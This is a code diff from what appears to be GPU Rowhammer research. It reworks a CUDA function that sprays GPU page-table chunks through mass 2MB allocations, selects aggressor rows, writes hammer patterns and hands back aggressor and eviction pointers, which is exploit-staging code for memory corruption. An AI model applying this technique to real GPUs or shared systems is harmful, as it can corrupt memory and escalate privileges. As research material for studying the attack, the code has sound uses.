@@ -128,7 +128,7 @@ bool first_PT_chunk(uint64_t num_alloc_init, uint64_t num_alloc, double threshol
     return true;
 }
 
-bool first_PT_chunk_fill(int argc, char *argv[], char ***first_ptc_ptrs, RowList *agg_row_list, std::vector<uint64_t> *agg_vec)
+bool first_PT_chunk_fill(int argc, char *argv[], char ***first_ptc_ptrs,  char ***agg_ptrs, char** evict_ptr, RowList *agg_row_list, std::vector<uint64_t> *agg_vec)
 {
     const uint64_t num_alloc_init = std::stoll(argv[0]);
     const uint64_t num_alloc = std::stoll(argv[1]);
@@ -136,11 +136,11 @@ bool first_PT_chunk_fill(int argc, char *argv[], char ***first_ptc_ptrs, RowList
     const double threshold = std::stod(argv[3]);
     const uint64_t skip = std::stoull(argv[4]);
 
-    return first_PT_chunk_fill(num_alloc_init, num_alloc, alloc_id, threshold, skip, first_ptc_ptrs, agg_row_list, agg_vec);
+    return first_PT_chunk_fill(num_alloc_init, num_alloc, alloc_id, threshold, skip, first_ptc_ptrs, agg_ptrs, evict_ptr, agg_row_list, agg_vec);
 }
 
 /* I should return the newly allocated memory, the aggressor pointer. */
-bool first_PT_chunk_fill(uint64_t num_alloc_init, uint64_t num_alloc, uint64_t alloc_id, double threshold, uint64_t skip , char ***first_ptc_ptrs, RowList *agg_row_list, std::vector<uint64_t> *agg_vec)
+bool first_PT_chunk_fill(uint64_t num_alloc_init, uint64_t num_alloc, uint64_t alloc_id, double threshold, uint64_t skip , char ***first_ptc_ptrs,  char ***agg_ptrs, char** evict_ptr, RowList *agg_row_list, std::vector<uint64_t> *agg_vec)
 {
     char **alloc_ptrs = nullptr;
     int timein;
@@ -175,7 +175,6 @@ bool first_PT_chunk_fill(uint64_t num_alloc_init, uint64_t num_alloc, uint64_t a
     const uint64_t num_rows   = 64100;
     const uint64_t vic_pat    = std::stoull("0x55", nullptr, 16);
     const uint64_t agg_pat    = std::stoull("0xAA", nullptr, 16);
-    std::ofstream bitflip_file("~/hammer_out.txt");
 
     std::ifstream row_set_file("/home/rootuser/gpuhammer-reloaded/gpuhammer/results/row_sets/ROW_SET_A.txt");
     RowList rows = read_row_from_file(row_set_file, layout);
@@ -196,93 +195,13 @@ bool first_PT_chunk_fill(uint64_t num_alloc_init, uint64_t num_alloc, uint64_t a
     std::cout << std::dec;
 
     /* Treat all rows as victim rows */
+    std::vector<uint64_t> good_agg;
     std::vector<uint64_t> all_vics(num_rows);
     std::iota(all_vics.begin(), all_vics.end(), 0);
-    // set_rows(rows, all_vics, vic_pat, step);
-    cudaDeviceSynchronize();
-
-    /* Dummy hammer to keep timing consistent, due to device startup time */
-    // start_simple_hammer(rows, all_vics, 1);
-
-    std::vector<int> bitflip_count(std::ceil((max_rowId - min_rowId) / skip_step), 0);
-
-    std::vector<uint64_t> good_agg;
     good_agg = get_aggressors(rows, min_rowId, num_victim + 1, row_step);
-    /* Running */
-    // for (int i = min_rowId; i < max_rowId; i += skip_step) {
-
-    //     /* Initialize indexes of victims and aggressors */
-    //     std::vector<uint64_t> victims = get_sequential_victims(rows, i, num_victim + 2, row_step);
-    //     std::vector<uint64_t> aggressors = get_aggressors(rows, i, num_victim + 1, row_step);
-        
-    //     std::cout << "Chosen Victims:" << vector_str(victims) << std::endl;
-    //     std::cout << "Chosen Aggressors:" << vector_str(aggressors) << std::endl;
-    //     std::cout << "==========================================================" << std::endl;
-
-    //     for (int j = 0; j < count_iter; j++) {
-        
-    //     std::cout << "Aggressor Iteration: " << j << std::endl;
-    //     auto start_loop = std::chrono::high_resolution_clock::now();
-
-    //     std::vector<uint64_t> pat_vics(110);
-    //     std::iota(pat_vics.begin(), pat_vics.end(), victims[0] - 4);
-
-    //     /* Sets the row and evict cache to store it in the memory. */
-    //     set_rows(rows, pat_vics, vic_pat, step);
-    //     set_rows(rows, aggressors, agg_pat, step);
-    //     cudaDeviceSynchronize();
-
-    //     evict_L2cache(layout);
-    //     cudaDeviceSynchronize();
-
-    //     auto start_hammer = std::chrono::high_resolution_clock::now();
-
-    //     /* Start the hammering and measure the time */
-    //     uint64_t time = start_multi_warp_hammer(rows, aggressors, it, n, k, aggressors.size(), delay, period);
-    //     print_time(time);
-    //     std::cout << "Average time per round: " << time / it << std::endl;
-
-    //     auto end_hammer = std::chrono::high_resolution_clock::now();
-
-    //     /* Verify result */
-    //     evict_L2cache(layout);
-
-    //     // Comment out the first line and uncomment the following line to check 
-    //     // for bit-flips in the nearby neighborhood to reduce hammering time.
-    //     // bool res = verify_all_content(rows, all_vics, aggressors, step, vic_pat);
-    //     bool res = verify_all_content(rows, pat_vics, aggressors, step, vic_pat);
-        
-    //     std::cout << "Bit-flip in victim rows: " 
-    //                             << (res ? "Observed Bit-Flip" : "No Bit-Flip") << std::endl;
-    //     if (res){
-    //         bitflip_count[std::ceil((i - min_rowId) / skip_step)] ++;
-    //         break;
-    //     } 
-
-    //     /* Clean up and prepare for next launch*/
-    //     cudaDeviceSynchronize();
-    //     auto end_loop = std::chrono::high_resolution_clock::now();
-
-    //     std::chrono::duration<double, std::milli> duration_evict = start_hammer - start_loop;
-    //     std::chrono::duration<double, std::milli> duration_hammer = end_hammer - start_hammer;
-    //     std::chrono::duration<double, std::milli> duration_verify = end_loop - end_hammer;
-    //     std::chrono::duration<double, std::milli> duration_total = end_loop - start_loop;
-    //     std::cout << "Evict time: " << duration_evict.count() << " ms" << std::endl;
-    //     std::cout << "Hammer time: " << duration_hammer.count() << " ms" << std::endl;
-    //     std::cout << "Verify time: " << duration_verify.count() << " ms" << std::endl;
-    //     std::cout <<"Total time: " << duration_total.count() << " ms" << std::endl;
-
-    //     std::cout <<"==========================================================" << std::endl;
-    //     }
-    //     if (bitflip_count[std::ceil((i - min_rowId) / skip_step)]){
-    //         good_agg = aggressors;
-    //         std::cout << "Min Row 2MB id: " << aggressors[0] << ' ' << (void*)rows[aggressors[0]][0] << ' ' << (uint64_t)(rows[aggressors[0]][0] - layout) / (2 * 1024 * 1024) << '\n';
-    //         break;
-    //     } 
-    // }
 
     char *temp;
-    std::cout << (void*)alloc_ptrs[alloc_id]<< '\n';
+    // std::cout << "Memory Allocated" << '\n';
     std::cin.clear();
     std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
     std::cin >> timein;
@@ -367,30 +286,41 @@ bool first_PT_chunk_fill(uint64_t num_alloc_init, uint64_t num_alloc, uint64_t a
 
     for (uint64_t i = 0; i < num_alloc - to_reserve - 1; i += 1)
         cudaFree(before_chunk_ptrs[i]);
+    free(before_chunk_ptrs);
 
     std::cout << "Prior Mem Freed " << '\n';
     std::cin.clear();
     std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
     std::cin >> timein;
-
+    
 
     // if (agg_ptr)
     //     *agg_ptr = before_chunk_ptrs[num_alloc-1];
-    // free(before_chunk_ptrs);
 
     std::cout << std::dec;
-    // if (first_ptc_ptrs)
-    first_ptc_ptrs = nullptr;
-    char** ptc_ptrs = (char **)malloc((num_alloc_init - 50 - to_reserve - 2) * sizeof(char*));
+    if (first_ptc_ptrs)
+        *first_ptc_ptrs = (char **)malloc((num_alloc_init - 50 - to_reserve - 4) * sizeof(char*));
+
     cudaMallocManaged(&temp, 50UL * 2 * 1024 * 1024);
     for (uint64_t i = 0; i < 50; i += 1)
     {
         initialize_memory<<<1,1>>>(temp + i * 2 * 1024 * 1024, 2 * 1024 * 1024);
         cudaDeviceSynchronize();
     }
-    ptc_ptrs[0] = temp;
+    if (evict_ptr)
+        *evict_ptr = temp;
 
-    for (uint64_t i = 1; i < num_alloc_init - 50 - to_reserve; i += 1)
+    
+    char** temp_ptrs = (char **)malloc((250) * sizeof(char*));
+    for (uint64_t i = 0; i < 250; i += 1)
+    {
+        cudaMalloc(&temp, 2 * 1024 * 1024);
+        initialize_memory<<<1,1>>>(temp, 2 * 1024 * 1024);
+        cudaDeviceSynchronize();
+        std::cout << "Iterating Mem: " << (void*) temp << '\n';
+        temp_ptrs[i] = temp;
+    }
+    for (uint64_t i = 0; i < 10000; i += 1)
     {
         // Create Free Space
         cudaMallocManaged(&temp, 2 * 1024 * 1024);
@@ -404,9 +334,48 @@ bool first_PT_chunk_fill(uint64_t num_alloc_init, uint64_t num_alloc, uint64_t a
         double currentMS = duration_evict.count();
         std::cout << i << " New PT time: " << duration_evict.count() << " ms"<< std::endl;
 
-        // if (first_ptc_ptrs)
-        //     (*first_ptc_ptrs)[i] = temp;
-        // ptc_ptrs[i] = temp;
+        if (first_ptc_ptrs)
+            (*first_ptc_ptrs)[i] = temp;
+
+        // Generate Page Table for 64KB Pages.
+        *(temp + 0) = 'a';
+
+        if (i < skip)
+            continue;
+    }
+
+    for (uint64_t i = 0; i < 250; i += 1)
+    {
+        // cudaMalloc(&temp, 2 * 1024 * 1024);
+        // initialize_memory<<<1,1>>>(temp, 2 * 1024 * 1024);
+        // cudaDeviceSynchronize();
+        // std::cout << "Iterating Mem: " << (void*) temp << '\n';
+        cudaFree(temp_ptrs[i]);
+    }
+
+    std::cout << to_reserve << '\n';
+    std::cout << hammer_pointers.size() << '\n';
+    std::cout << "First PTC Filled " << '\n';
+    std::cin.clear();
+    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
+    std::cin >> timein;
+
+    for (uint64_t i = 10000; i < num_alloc_init - 50 - to_reserve - 4; i += 1)
+    {
+        // Create Free Space
+        cudaMallocManaged(&temp, 2 * 1024 * 1024);
+        auto start = std::chrono::high_resolution_clock::now();
+        initialize_memory<<<1,1>>>(temp, 2 * 1024 * 1024);
+        cudaDeviceSynchronize();
+        auto end = std::chrono::high_resolution_clock::now();
+
+        gpuErrchk(cudaPeekAtLastError());
+        std::chrono::duration<double, std::milli> duration_evict = end - start;
+        double currentMS = duration_evict.count();
+        std::cout << i << " New PT time: " << duration_evict.count() << " ms"<< std::endl;
+
+        if (first_ptc_ptrs)
+            (*first_ptc_ptrs)[i] = temp;
 
         // Generate Page Table for 64KB Pages.
         *(temp + 0) = 'a';
@@ -416,15 +385,28 @@ bool first_PT_chunk_fill(uint64_t num_alloc_init, uint64_t num_alloc, uint64_t a
     }
 
     std::cout << to_reserve << '\n';
+    std::cout << hammer_pointers.size() << '\n';
     std::cout << "First PTC Filled " << '\n';
     std::cin.clear();
     std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
     std::cin >> timein;
 
-    // auto offset_map = get_relative_aggressor_offset(rows, good_agg, layout);
-    // auto row_agg_pair = get_aggressor_rows_from_offset(hammer_pointers, offset_map);
-    // set_rows(row_agg_pair.first, row_agg_pair.second, agg_pat, step);
-    // cudaDeviceSynchronize();
+    auto offset_map = get_relative_aggressor_offset(rows, good_agg, layout);
+    auto row_agg_pair = get_aggressor_rows_from_offset(hammer_pointers, offset_map);
+    set_rows(row_agg_pair.first, row_agg_pair.second, agg_pat, step);
+    cudaDeviceSynchronize();
+
+    *agg_row_list = row_agg_pair.first;
+    *agg_vec = row_agg_pair.second;
+    if (agg_ptrs)
+    {
+        *agg_ptrs = (char **)malloc((hammer_pointers.size()) * sizeof(char*));
+        for (int i = 0; i < hammer_pointers.size(); i++)
+            (*agg_ptrs)[i] = (char *)hammer_pointers[i];
+            
+    }
+
+
     // for (int j = 0; j < 100; j++)
     // {
     //     evict_L2cache ((uint8_t *) ptc_ptrs[0]);
@@ -434,9 +416,9 @@ bool first_PT_chunk_fill(uint64_t num_alloc_init, uint64_t num_alloc, uint64_t a
     //         row_agg_pair.first, row_agg_pair.second, it, n, k, row_agg_pair.second.size (), delay, period);
     // }
 
-    std::cout << "First PTC Filled " << '\n';
-    std::cin.clear();
-    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
-    std::cin >> timein;
+    // std::cout << "First PTC Filled " << '\n';
+    // std::cin.clear();
+    // std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
+    // std::cin >> timein;
     return true;
 }
